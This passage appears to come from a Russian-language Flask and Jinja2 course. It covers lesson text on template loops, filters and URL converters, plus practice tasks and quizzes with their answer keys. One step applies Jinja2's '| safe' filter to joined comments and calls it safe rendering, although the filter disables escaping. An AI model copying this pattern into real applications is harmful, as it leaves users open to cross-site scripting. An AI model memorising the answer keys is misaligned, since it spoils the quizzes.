style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:13.5pt;\" lang=\"EN-US\"></span>\r\n &nbsp;&nbsp;&nbsp;&nbsp; &lt;/div&gt;<span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:13.5pt;\" lang=\"EN-US\"></span>\r\n &nbsp;&nbsp; {% endfor %}<span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:13.5pt;\" lang=\"EN-US\"></span>\r\n  &lt;/div&gt;<span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:13.5pt;\" lang=\"EN-US\"></span>\r\n{% endblock %}<span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:13.5pt;\" lang=\"EN-US\"></span></code></pre><p>Пояснения<span> </span>к<span> </span>коду<span lang=\"EN-US\">:</span></p><p>В тэге &lt;h1&gt; (заголовке страницы) мы пишем не статичный текст (как мы сделали на страницах index и about) а берём текст из параметра, переданного обработчиком маршрута comments. (В данном случае он совпадает с текстом в &lt;title&gt;).</p><p>Также мы можем использовать обычным образом css-классы, для стилизации списка комментариев.</p><p></p><p>&nbsp;</p><p>3. Замените код в файле <span lang=\"EN-US\">style</span>.<span lang=\"EN-US\">css</span><span lang=\"EN-US\"> </span>на следующий:</p><pre><code class=\"language-jinja2\">.comments-container {<span lang=\"EN-US\"></span>\r\n  width:50%;<span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;\" lang=\"EN-US\"></span>\r\n  margin:auto;<span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;\" lang=\"EN-US\"></span>\r\n}<span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;\" lang=\"EN-US\"></span>\r\n.comment-block {<span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;\" lang=\"EN-US\"></span>\r\n  padding: 10px;<span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;\" lang=\"EN-US\"></span>\r\n  background-color:#EEE;<span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;\" lang=\"EN-US\"></span>\r\n  margin-bottom: 10px;<span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;\" lang=\"EN-US\"></span>\r\n}<span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;\" lang=\"EN-US\"></span>\r\n.comment-text {<span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;\" lang=\"EN-US\"></span>\r\n  font-size: 24px;<span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;\" lang=\"EN-US\"></span>\r\n}<span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;\" lang=\"EN-US\"></span>\r\n.menu-list {<span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;\" lang=\"EN-US\"></span>\r\n  list-style-type: none;<span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;\" lang=\"EN-US\"></span>\r\n  padding: 0;<span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;\" lang=\"EN-US\"></span>\r\n}<span style=\"line-height:115%;mso-bidi-font-size:12.5pt;\"></span></code></pre><p></p><p>&nbsp;</p><p>4. Замените часть кода в файле <span lang=\"EN-US\">base</span>.<span lang=\"EN-US\">html</span> .</p><p>Замените блок &lt;<span lang=\"EN-US\">nav</span>&gt; следующим кодом:</p><pre><code class=\"language-jinja2\">&lt;nav class='menu'&gt;<span lang=\"EN-US\"></span>\r\n  &lt;h2&gt;Меню&lt;/h2&gt;<span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;\" lang=\"EN-US\"></span>\r\n  &lt;ul class=\"menu-list\"&gt;<span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;\" lang=\"EN-US\"></span>\r\n &nbsp;&nbsp; &lt;li&gt;<span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;\" lang=\"EN-US\"></span>\r\n &nbsp;&nbsp;&nbsp;&nbsp; &lt;a href=\"{{ url_for('index') }}\"&gt;Главная&lt;/a&gt;<span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;\" lang=\"EN-US\"></span>\r\n &nbsp;&nbsp; &lt;/li&gt;<span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;\" lang=\"EN-US\"></span>\r\n &nbsp;&nbsp; &lt;li&gt;<span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;\" lang=\"EN-US\"></span>\r\n &nbsp;&nbsp;&nbsp;&nbsp; &lt;a href=\"{{ url_for('comments') }}\"&gt;Комментарии&lt;/a&gt;<span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;\" lang=\"EN-US\"></span>\r\n &nbsp;&nbsp; &lt;/li&gt;<span style=\"line-height:115%;mso-bidi-font-size:12.5pt;\"></span>\r\n  &lt;/ul&gt;<span style=\"line-height:115%;mso-bidi-font-size:12.5pt;\"></span>\r\n&lt;/nav&gt;<span style=\"line-height:115%;mso-bidi-font-size:12.5pt;\"></span></code></pre><p></p><p>&nbsp;</p><p>5. Запустите и протестируйте приложение и страницу комментариев.</p><p></p><p>&nbsp;</p><p>6. Теперь давайте сделаем так, чтобы блоки с комментариями нумеровались, а также, чтобы блоки с чётными и нечётными номерами были с разным фоном.</p><p>Измените код цикла for в шаблоне comments.html на следующий:</p><pre><code class=\"language-jinja2\">&lt;div class=\"comments-container\"&gt;<span lang=\"EN-US\"></span>\r\n  {% for comment in comments %}<span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;\" lang=\"EN-US\"></span>\r\n &nbsp;&nbsp; &lt;div class=\"comment-block {{ 'even' if loop.index is even else 'odd' }}\"&gt;<span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;\" lang=\"EN-US\"></span>\r\n &nbsp;&nbsp;&nbsp;&nbsp; &lt;p&gt;#{{ loop.index }}&lt;/p&gt;<span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;\" lang=\"EN-US\"></span>\r\n &nbsp;&nbsp;&nbsp;&nbsp; &lt;p class=\"comment-text\"&gt;{{ comment }}&lt;/p&gt;<span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;\" lang=\"EN-US\"></span>\r\n &nbsp;&nbsp; &lt;/div&gt;<span style=\"line-height:115%;mso-bidi-font-size:12.5pt;\"></span>\r\n  {% endfor %}<span style=\"line-height:115%;mso-bidi-font-size:12.5pt;\"></span>\r\n&lt;/div&gt;<span style=\"line-height:115%;mso-bidi-font-size:12.5pt;\"></span></code></pre><p style=\"line-height:110%;\"><span style=\"color:black;\"><span>Пояснение к коду:</span></span></p><p style=\"line-height:110%;\"><span style=\"color:black;\"><span>В шаблонизаторе </span><span lang=\"EN-US\">Jinja</span><span lang=\"EN-US\"> </span><span>2 ключевое слово </span><span lang=\"EN-US\">loop</span><span lang=\"EN-US\"> </span><span>(цикл, петля, виток) используется для доступа к специальным переменным-параметрам цикла.</span></span></p><p>Переменная-параметр loop.index - возвращает номер текущей итерации цикла, начиная с 1. <span style=\"color:black;\"><span>По другому говоря: loop.index - это такой счётчик цикла, который начинается не с нуля, а с единицы.</span></span></p><p>В первой итерации loop.index = 1</p><p>Во второй итерации loop.index = 2</p><p>И так далее...</p><p>Похожие переменные цикла:</p><p>loop.index0 — начинается с 0 (0, 1, 2...)</p><p>loop.first — True для первой итерации</p><p>loop.last — True для последней итерации</p><p>loop.length — общее количество элементов</p><p>Это удобно для создания чередующегося оформления (полосатых таблиц, списков) и нумерации элементов.</p><p>В коде выше, конструкция:</p><p><span style=\"font-family:&quot;Courier New&quot;;\"><code>{{ 'even' if loop.index is even else 'odd' }}</code></span>&nbsp;</p><p>- проверяет, четный ли номер итерации:</p><p>Если четный → добавляет класс even</p><p>Если нечетный → добавляет класс odd</p><p><span style=\"color:black;\"><span>Т.е. в зависимости от чётности/нечётности номера мы устанавливаем разный цвет фона с помощью </span><span lang=\"EN-US\">CSS</span><span>.</span></span></p><p><span style=\"font-family:&quot;Courier New&quot;;\">#{{ loop.index }}</span> - выводит порядковый номер комментария (1, 2, 3...)</p><p></p><p style=\"line-height:110%;\">&nbsp;</p><p style=\"line-height:110%;\"><span style=\"color:black;\"><span>Задание 1.</span></span></p><p style=\"line-height:110%;\"><span style=\"color:black;\"><span>На странице комментариев сделайте так, чтобы фон самого первого комментария был голубого цвета.</span></span></p><p style=\"line-height:110%;\"><span style=\"color:black;\"><span></span></span></p><p style=\"line-height:110%;\">&nbsp;</p><p style=\"line-height:110%;\"><span style=\"color:black;\"><span>Задание 2.</span></span></p><p style=\"line-height:110%;\">Добавьте в шаблон вывод общего количества комментариев над списком, используя возможности Jinja2 без изменения Python-кода.</p><p style=\"line-height:110%;\">&nbsp;</p><p style=\"line-height:110%;\"><span style=\"color:black;\"><span>Задание 3.</span></span></p><p style=\"line-height:110%;\">Измените страницу комментариев так, чтобы последний комментарий дополнительно помечался текстом «(последний)».<span style=\"color:black;\"><span></span></span></p><p style=\"line-height:110%;\"></p><p>&nbsp;</p><p>7. Предположим, мы хотим, чтобы текст комментариев отображался в верхнем регистре. Замените строку кода, где выводится очередной комментарий на следующую:</p><p class=\"a\"><code><span lang=\"EN-US\">&lt;p class=\"comment-text\"&gt;{{ comment | upper }}&lt;/p&gt;</span></code><span lang=\"EN-US\"></span></p><p>Вертикальная черта | в jinja2 определяет добавочные методы, которые можно применить к данным, например поменять регистр или отсортировать. С этими методами познакомимся позже.</p><p>(Хотя, конечно, верхний регистр правильнее было бы сделать стилями <span lang=\"EN-US\">CSS</span>).</p><p></p><p style=\"line-height:110%;\">&nbsp;</p><p style=\"line-height:110%;\"><span style=\"color:black;\"><span>8. Мы можем объединить все комментарии в одну строку (методом </span><span lang=\"EN-US\">join</span><span>()). Замените</span><span> </span><span>весь</span><span> </span><span>код</span><span> </span><span>блока</span><span> </span><span>комментариев</span><span lang=\"EN-US\"> comments-container </span><span>на</span><span> </span><span>следующий</span><span lang=\"EN-US\">:</span></span></p><pre><code class=\"language-jinja2\">&lt;div class=\"comments-container\"&gt;<span style=\"color:black;\"><span lang=\"EN-US\"></span></span>\r\n  &lt;p class=\"comment-text\"&gt; {{ comments | join(\" | \") }} &lt;/p&gt;<span style=\"color:black;\"><span lang=\"EN-US\"></span></span>\r\n&lt;/div&gt;<span style=\"color:black;\"><span></span></span></code></pre><p style=\"line-height:110%;\"><span style=\"color:black;\"><span></span></span></p><p style=\"line-height:110%;\">&nbsp;</p><p style=\"line-height:110%;\"><span style=\"color:black;\"><span>9. Допустим, мы хотим выводить каждый комментарий в абзаце и разделённый горизонтальной чертой. Попробуем</span><span> </span><span>такую</span><span> </span><span>идею</span><span lang=\"EN-US\">:</span></span></p><pre><code class=\"language-jinja2\">&lt;div class=\"comments-container\"&gt;<span style=\"color:black;\"><span lang=\"EN-US\"></span></span>\r\n  &lt;p class=\"comment-text\"&gt; {{ comments | join(\" &lt;hr&gt; &lt;p class='comment-text'&gt;\") }}<span style=\"color:black;\"><span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;mso-themecolor:text1;\" lang=\"EN-US\"></span></span>\r\n&lt;/div&gt;<span style=\"color:black;\"><span style=\"line-height:115%;mso-bidi-font-size:12.5pt;mso-themecolor:text1;\"></span></span></code></pre><p style=\"line-height:110%;\"><span style=\"color:black;\"><span>Мы видим, что рендеринг </span><span lang=\"EN-US\">html</span><span>-кода осуществлён некорректно.</span><span>&nbsp;</span><span></span></span></p><p style=\"line-height:110%;\"><span style=\"color:black;\"><span>Здесь нужно добавить специальный параметр </span><code><span lang=\"EN-US\">safe</span></code><span> (безопасный рендеринг </span><span lang=\"EN-US\">html</span><span>):</span></span></p><pre><code class=\"language-jinja2\">&lt;div class=\"comments-container\"&gt;<span style=\"color:black;\"><span lang=\"EN-US\"></span></span>\r\n  &lt;p class=\"comment-text\"&gt; {{ comments | join(\" &lt;hr&gt; &lt;p class='comment-text'&gt;\") | safe }}<span style=\"color:black;\"><span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:12.5pt;mso-themecolor:text1;\" lang=\"EN-US\"></span></span>\r\n&lt;/div&gt;<span style=\"color:black;\"><span style=\"line-height:115%;mso-bidi-font-size:12.5pt;mso-themecolor:text1;\"></span></span></code></pre><p style=\"line-height:110%;\"><span style=\"color:black;\"><span>Обратите внимание: мы не ставим закрывающий тэг абзаца &lt;/</span><span lang=\"EN-US\">p</span><span>&gt;. Браузер расставит их автоматически.</span></span></p><p style=\"line-height:110%;\"><span style=\"color:black;\"><span></span></span></p><p><span style=\"color:red;\"></span></p><h4>&nbsp;</h4><h4>2. Ещё один пример</h4><p><span style=\"color:black;\"><span>1. Предположим у нас есть данные успеваемости студентов:</span></span></p><p><span style=\"color:black;\"><span>(в виде списка словарей)</span></span></p><pre><code class=\"language-python\">students = [<span style=\"color:black;\"><span lang=\"EN-US\"></span></span>\r\n &nbsp;&nbsp; {\"name\": \"Диас\",  \"score\": 70},<span style=\"color:black;\"><span lang=\"EN-US\"></span></span>\r\n &nbsp;&nbsp; {\"name\": \"Олег\", \"score\": 100},<span style=\"color:black;\"><span lang=\"EN-US\"></span></span>\r\n &nbsp;&nbsp; {\"name\": \"Светлана\", \"score\": 60},<span style=\"color:black;\"><span lang=\"EN-US\"></span></span>\r\n &nbsp;&nbsp; {\"name\": \"Алишер\", \"score\": 85},<span style=\"color:black;\"><span lang=\"EN-US\"></span></span>\r\n &nbsp;&nbsp; {\"name\": \"Максим\", \"score\": 40},<span style=\"color:black;\"><span></span></span>\r\n]<span style=\"color:black;\"><span></span></span></code></pre><p><span style=\"color:black;\"><span>Добавьте этот список в файл </span><span lang=\"EN-US\">app</span><span>.</span><span lang=\"EN-US\">py</span><span> перед функциями рендеринга маршрутов.</span></span></p><p><span style=\"color:black;\"><span>(Если там есть другие данные из предыдущих уроков (списки, словари) - удалите их.)</span></span></p><p><span style=\"color:black;\"><span></span></span></p><p>&nbsp;</p><p><span style=\"color:black;\"><span>2. Также добавьте маршрут</span><span>&nbsp; </span><span>страницы 'results.html', передав ему параметром список:</span></span></p><p class=\"a\"><span style=\"color:black;\"><span lang=\"EN-US\">@app.route(\"/results/\")</span></span></p><p class=\"a\"><span style=\"color:black;\"><span lang=\"EN-US\">def results():</span></span></p><p class=\"a\"><span style=\"color:black;\"><span lang=\"EN-US\">&nbsp; </span><span lang=\"EN-US\">return render_template(</span></span></p><p class=\"a\"><span style=\"color:black;\"><span lang=\"EN-US\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span lang=\"EN-US\">'results.html',</span></span></p><p class=\"a\"><span style=\"color:black;\"><span lang=\"EN-US\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span lang=\"EN-US\">title=\"</span><span>Результаты</span><span lang=\"EN-US\">\",</span></span></p><p class=\"a\"><span style=\"color:black;\"><span lang=\"EN-US\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span lang=\"EN-US\"> &nbsp;</span><span lang=\"EN-US\">students=students,</span></span></p><p class=\"a\"><span style=\"color:black;\"><span lang=\"EN-US\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span lang=\"EN-US\">test_name='</span><span>Тест</span><span> </span><span>по</span><span lang=\"EN-US\"> Python',</span></span></p><p class=\"a\"><span style=\"color:black;\"><span lang=\"EN-US\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span>max_score=100, # максимальный балл )</span></span></p><p><span style=\"color:black;\"><span></span></span></p><p>&nbsp;</p><p><span style=\"color:black;\"><span>3. В каталоге </span><span lang=\"EN-US\">templates</span><span> - создайте страницу </span><span lang=\"EN-US\">results</span><span>.</span><span lang=\"EN-US\">html</span><span> со следующим кодом:</span></span></p><pre><code class=\"language-jinja2\">{% extends 'base.html' %}\r\n<span style=\"color:black;\"><span lang=\"EN-US\"></span></span>\r\n{% block content %}<span style=\"color:black;\"><span lang=\"EN-US\"></span></span>\r\n&lt;h1&gt; Результаты теста: {{ test_name }}&lt;/h1&gt;<span style=\"color:black;\"><span></span></span>\r\n&lt;ul&gt;<span style=\"color:black;\"><span lang=\"EN-US\"></span></span>\r\n{% for student in students %}<span style=\"color:black;\"><span lang=\"EN-US\"></span></span>\r\n  &lt;li&gt;<span style=\"color:black;\"><span lang=\"EN-US\"></span></span>\r\n &nbsp;&nbsp; &lt;em&gt;{{student.name}}:&lt;/em&gt; {{student.score}}/{{max_score}}<span style=\"color:black;\"><span lang=\"EN-US\"></span></span>\r\n  &lt;/li&gt;<span style=\"color:black;\"><span lang=\"EN-US\"></span></span>\r\n{% endfor %}<span style=\"color:black;\"><span lang=\"EN-US\"></span></span>\r\n&lt;/ul&gt;<span style=\"color:black;\"><span lang=\"EN-US\"></span></span>\r\n{% endblock %}<span style=\"color:black;\"><span lang=\"EN-US\"></span></span></code></pre><p><span style=\"color:black;font-family:&quot;Courier New&quot;;\"><span lang=\"EN-US\"></span></span></p><p>&nbsp;</p><p><span style=\"color:black;\"><span lang=\"EN-US\">4. </span><span lang=\"KZ\">Самостоятельно добавьте гиперссылку на страницу </span><span lang=\"EN-US\">'results.html'</span><span lang=\"KZ\"> в </span><span lang=\"EN-US\">'base.html'</span></span></p><p><span style=\"color:black;\"><span lang=\"EN-US\"></span></span></p><p>&nbsp;</p><p><span style=\"color:black;\"><span>5. Запустите код и протестируйте.</span></span></p><p><span style=\"color:black;\"><span>Проанализируйте код в шаблоне </span><code><span lang=\"EN-US\">results</span><span>.</span><span lang=\"EN-US\">html</span></code><span>. Обратите внимание как идёт обращение к ключам словаря через точку </span></span><span style=\"color:black;font-family:&quot;Courier New&quot;;\"><code><span>student.name</span></code></span><span style=\"color:black;font-size:13.0pt;\"><span style=\"line-height:115%;mso-themecolor:text1;\"> .</span></span><span style=\"color:black;\"><span></span></span></p><p><span style=\"color:black;\"><span></span></span></p><p>&nbsp;</p><p><span style=\"color:black;\"><span>6. Усложним логику предыдущего примера и добавим условия:</span></span></p><p><span style=\"color:black;\"><span>Измените цикл </span><span lang=\"EN-US\">for</span><span> в шаблоне </span><code><span lang=\"EN-US\">results</span><span>.</span><span lang=\"EN-US\">html</span></code><span> следующим образом:</span></span></p><p><span style=\"color:black;font-size:12.0pt;\"><span style=\"line-height:115%;mso-themecolor:text1;\">(Остальной код остаётся тот же)</span></span></p><pre><code class=\"language-jinja2\">{% for student in students %}<span style=\"color:black;font-size:13.0pt;\"><span style=\"line-height:115%;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"></span></span>\r\n  &lt;li&gt;<span style=\"color:black;font-size:13.0pt;\"><span style=\"line-height:115%;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"></span></span>\r\n &nbsp;&nbsp; {% if student.score &gt;= 90 %} &amp;#x2B50;<span style=\"color:black;font-size:13.0pt;\"><span style=\"line-height:115%;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"></span></span>\r\n &nbsp;&nbsp; {% elif student.score &gt;= 70 and student.score &lt; 90 %} &amp;#x1F600;<span style=\"color:black;font-size:13.0pt;\"><span style=\"line-height:115%;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"></span></span>\r\n &nbsp;&nbsp; {% else %} &amp;#x1F615;<span style=\"color:black;font-size:13.0pt;\"><span style=\"line-height:115%;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"></span></span>\r\n &nbsp;&nbsp; {% endif %}<span style=\"color:black;font-size:13.0pt;\"><span style=\"line-height:115%;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"></span></span>\r\n &nbsp;&nbsp; &lt;em&gt;{{student.name}}:&lt;/em&gt; {{student.score}}/{{max_score}}<span style=\"color:black;font-size:13.0pt;\"><span style=\"line-height:115%;mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"></span></span>\r\n  &lt;/li&gt;<span style=\"color:black;font-size:13.0pt;\"><span style=\"line-height:115%;mso-themecolor:text1;\"></span></span>\r\n{% endfor %}<span style=\"color:black;font-size:13.0pt;\"><span style=\"line-height:115%;mso-themecolor:text1;\"></span></span></code></pre><p><span style=\"color:black;\"><span></span></span></p><p>&nbsp;</p><p><span style=\"color:black;\"><span>7. Протестируйте работу приложения. Проанализируйте код. Разберитесь, что означают конструкции вида </span></span><span style=\"color:black;font-family:&quot;Courier New&quot;;\"><span>&amp;#x2B50;</span></span><span style=\"color:black;\"><span> и подобные.</span></span></p>"
            },
            "is_published": true
        },
        {
            "id": 9,
            "section_id": 1,
            "number": 6,
            "name": "Переменная часть адреса. errorhandler. redirect",
            "slug": "adress-errorhandler-redirect",
            "content": {
                "tasks": [
                    {
                        "id": 1,
                        "content": "<p>Самостоятельно сделайте страницу ошибки 'page_404.html' на свой вкус используя <span style=\"mso-ansi-language:EN-US;\" lang=\"EN-US\">CSS</span> стилизацию.<br>(Если вы не владеете CSS - воспользуйтесь ИИ.<br>\"Скормите ему HTML-код и попросите добавить к этому HTML соответствующий CSS, для красивой стилизации\")</p>"
                    },
                    {
                        "id": 2,
                        "content": "<p class=\"MsoNormal\">Создайте маршрут /post/<int:post_id> и выведите на странице текст Post {post_id}. Проверьте работу маршрута с разными целыми числами.</int:post_id></p>"
                    },
                    {
                        "id": 3,
                        "content": "<p class=\"MsoNormal\">Объедините переменные маршрутов и redirect: создайте маршрут /go/&lt;username&gt; — при переходе по нему пользователь автоматически перенаправляется на маршрут /users/&lt;username&gt;. Проверьте работу редиректа для разных значений username.</p>"
                    }
                ],
                "tests": [
                    {
                        "id": 1,
                        "options": [
                            "Секцию, которая игнорируется сервером",
                            "Тип файла HTML, который будет отдан пользователю",
                            "Имя шаблона, используемого для маршрута",
                            "Динамическую переменную, которая передаётся в функцию обработчика "
                        ],
                        "question": "Что обозначает часть URL в Flask, заключённая в угловые скобки <…>?",
                        "correct_index": 3
                    },
                    {
                        "id": 2,
                        "options": [
                            "number",
                            "path",
                            "integer",
                            "int"
                        ],
                        "question": "Какой конвертер следует использовать, если нужно принимать только целые числа в маршруте?",
                        "correct_index": 3
                    },
                    {
                        "id": 3,
                        "options": [
                            "Ошибка 404 ",
                            "Строковое значение переменной",
                            "0",
                            "Пустую страницу"
                        ],
                        "question": "Что вернёт Flask, если пользователь введёт в маршрут /users/<int:user_ID> строку, которая не является числом?",
                        "correct_index": 0
                    },
                    {
                        "id": 4,
                        "options": [
                            "path ",
                            "int",
                            "slash",
                            "uuid"
                        ],
                        "question": "Какой конвертер позволяет принимать в переменной части маршрута символ /?",
                        "correct_index": 0
                    },
                    {
                        "id": 5,
                        "options": [
                            "Создаёт обработчик для всех ошибок сервера",
                            "Создаёт обработчик для конкретного кода ответа HTTP ",
                            "Автоматически перенаправляет пользователя на главную страницу",
                            "Обрабатывает ошибки пользователя"
                        ],
                        "question": "Что делает декоратор @app.errorhandler(404)?",
                        "correct_index": 1
                    },
                    {
                        "id": 6,
                        "options": [
                            "Перенаправляет пользователя на другой маршрут или URL ",
                            "Создаёт шаблон страницы",
                            "Устанавливает cookie",
                            "Возвращает код ошибки сервера"
                        ],
                        "question": "Что делает функция redirect() во Flask?",
                        "correct_index": 0
                    },
                    {
                        "id": 7,
                        "options": [
                            "Чтобы получить HTML-код страницы",
                            "Чтобы создать внешнюю ссылку на другой сайт",
                            "Чтобы указать внутренний маршрут Flask по имени функции обработчика ",
                            "Чтобы очистить данные сессии"
                        ],
                        "question": "Для чего используется функция url_for() вместе с redirect()?",
                        "correct_index": 2
                    },
                    {
                        "id": 8,
                        "options": [
                            "Да ",
                            "Нет",
                            "Только внутри приложения",
                            "Только с конвертером path"
                        ],
                        "question": "Можно ли использовать redirect() для перенаправления на внешний сайт?",
                        "correct_index": 0
                    },
                    {
                        "id": 9,
                        "options": [
                            "Автоматически откроется главная страница",
                            "Создастся новая переменная в URL",
                            "Сработает redirect на главную страницу",
                            "Выведется стандартная страница с кодом 404 "
                        ],
                        "question": "Что произойдёт, если в приложении отсутствует маршрут, а пользователь введёт несуществующий URL?",
                        "correct_index": 3
                    }
                ],
                "theory_html": "<h4>1. Переменная часть адреса (<span lang=\"EN-US\">URL</span>)<span style=\"color:black;font-family:&quot;Yandex Sans Display Light&quot;,&quot;serif&quot;;\"></span></h4><p>Представим себе, что у нас приложение с регистрацией пользователей и мы предоставляем или не предоставляем контент в зависимости от того, зарегистрирован данный пользователь или нет.</p><p style=\"tab-stops:232.15pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p><p>В файле <span lang=\"EN-US\">app</span>.<span lang=\"EN-US\">py</span><span lang=\"EN-US\"> </span>создайте следующий маршрут:</p><p>(временно, мы протестируем идею и потом уберём этот маршрут)</p><pre><code class=\"language-python\">@app.route(\"/users/&lt;username&gt;\")<span lang=\"EN-US\"></span>\r\ndef users(username):<span style=\"line-height:115%;mso-ansi-language:EN-US;mso-bidi-font-size:13.5pt;\" lang=\"EN-US\"></span>\r\n &nbsp;&nbsp; return f\"Пользователь: {username}\"<span style=\"line-height:115%;mso-bidi-font-size:13.5pt;\"></span></code></pre><p>Здесь мы в маршруте <span style=\"font-family:&quot;Courier New&quot;;\"><span style=\"line-height:115%;mso-bidi-font-size:13.5pt;\">/users</span></span><span style=\"line-height:115%;mso-bidi-font-size:13.5pt;\"> далее указываем в угловых скобках переменную часть маршрута </span><span style=\"font-family:&quot;Courier New&quot;;\"><span style=\"line-height:115%;mso-bidi-font-size:13.5pt;\">/&lt;username&gt;</span></span><span style=\"line-height:115%;mso-bidi-font-size:13.5pt;\"> (в данном случае имя пользователя)</span></p><p>Запустите приложение (главную станицу) и в адресной строке браузера перейдите по адресу:</p><p><span style=\"font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;;\"><code><span>http://127.0.0.1:5000/users/user-1</span></code><span></span></span></p><p>Браузер выведет:&nbsp;</p><p><span style=\"color:black;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;;font-size:13.5pt;\"><code><span style=\"line-height:115%;mso-ascii-theme-font:minor-latin;mso-bidi-theme-font:minor-latin;mso-hansi-theme-font:minor-latin;\">Пользователь: user-1</span></code></span></p><p>Т.е. мы передали параметр (переменную часть <span lang=\"EN-US\">URL</span>) в приложение.</p><p>Измените имя <span lang=\"EN-US\">user</span>-1 на любое другое и протестируйте.</p><p>В дальнейшем, в зависимости от значения этой переменной части адреса мы можем по разному определять логику работы нашего приложения.</p><p></p><p>Теперь попробуйте ввести адрес:</p><p><span style=\"font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;;\"><code><span>http://127.0.0.1:5000/users/12345</span></code><span></span></span></p><p>Соответственно, username = \"12345\", но это не число 12345, а строка \"12345\".<span>&nbsp; </span>То есть все, что указывается в URL, записывается в виде строки.</p><p></p><p>Если нам нужно, в качестве параметра указать именно число, например числовой идентификатор пользователя <span lang=\"EN-US\">ID</span>, мы можем использовать конвертер.</p><pre><code class=\"language-python\">@app.route(\"/users/&lt;int:user_ID&gt;\")\r\ndef users(user_ID):<code><span lang=\"EN-US\"></span></code>\r\n &nbsp;&nbsp; return f\"Пользователь: {user_ID}\"<span lang=\"EN-US\"></span></code></pre><p>Снова введите адрес:&nbsp;</p><p><span style=\"font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;;\"><code><span>http://127.0.0.1:5000/users/12345</span></code><span></span></span></p><p>Визуально в браузере ничего не изменилось, но теперь мы получили в приложение не строку, а целое число, применив конвертор <span style=\"font-family:&quot;Courier New&quot;;\">int:</span> .</p><p>Если мы сейчас введём не число а строку (даже с цифрами):</p><p class=\"a\"><code>http://127.0.0.1:5000/users/12345abc</code></p><p>Браузер вернёт ошибку 404.</p><p></p><p>В качестве конверторов можно использовать следующие обозначения:</p><p>int – должны присутствовать только цифры;</p><p>float – можно записывать число с плавающей точкой;</p><p>path – можно использовать любые допустимые символы URL плюс символ слеша ‘/’</p><p></p><p>Например, при конверторе path:</p><pre><code class=\"language-python\">@app.route(\"/users/&lt;path:username&gt;\")\r\ndef users(username):<span lang=\"EN-US\"></span>\r\n &nbsp;&nbsp; return f\"Пользователь: {username}\"<span lang=\"EN-US\"></span></code></pre><p>Можно сформировать следующий запрос:</p><p><span style=\"font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;;\"><code><span>http://127.0.0.1:5000/users/12345/path</span></code><span></span></span></p><p>Браузер выведет:</p><p><span style=\"color:black;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;;\"><code><span>Пользователь: 12345/path</span></code><span></span></span></p><p><span style=\"color:black;\">Но если убрать конвертор </span>path:</p><p 